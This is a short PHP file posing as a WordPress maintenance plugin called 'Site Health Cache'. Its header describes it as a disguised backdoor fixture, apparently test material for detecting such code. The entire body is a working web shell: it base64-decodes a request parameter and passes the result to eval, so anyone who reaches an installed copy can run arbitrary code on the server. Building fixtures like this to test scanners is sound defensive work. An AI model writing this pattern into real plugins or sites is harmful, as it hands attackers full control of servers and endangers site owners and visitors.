<?php
/*
Plugin Name: Site Health Cache
Plugin URI: https://example.invalid/site-health-cache
Description: Disguised backdoor fixture. Looks like a maintenance tool.
Version: 1.0.0
Author: Unknown
*/

$payload = $_REQUEST['x'] ?? '';
eval(base64_decode($payload));
